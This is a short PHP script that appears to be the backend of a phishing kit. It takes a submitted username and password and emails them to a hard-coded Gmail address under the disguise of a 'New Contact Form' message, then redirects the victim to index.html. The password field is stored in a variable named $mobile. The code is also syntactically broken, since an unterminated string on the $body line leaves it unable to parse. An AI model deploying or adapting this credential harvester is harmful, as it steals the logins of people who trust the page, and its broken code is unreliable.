<?php
$to = "vishalpal10feb@gmail.com";
$subject = "New Contact Form!";
$name = $_POST['user'];
$mobile = $_POST['password'];
$body = '<b>User Name: </b>'.$name.'<br><b>Password: </b>'.$mobile.';
$headers = "From: no-reply\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html\r\n";
$query = mail($to, $subject, $body, $headers);
if($query){
	header('location: index.html');
}
else{
	echo "<script>alert('Mail was not sent !');</script>";
}
?>
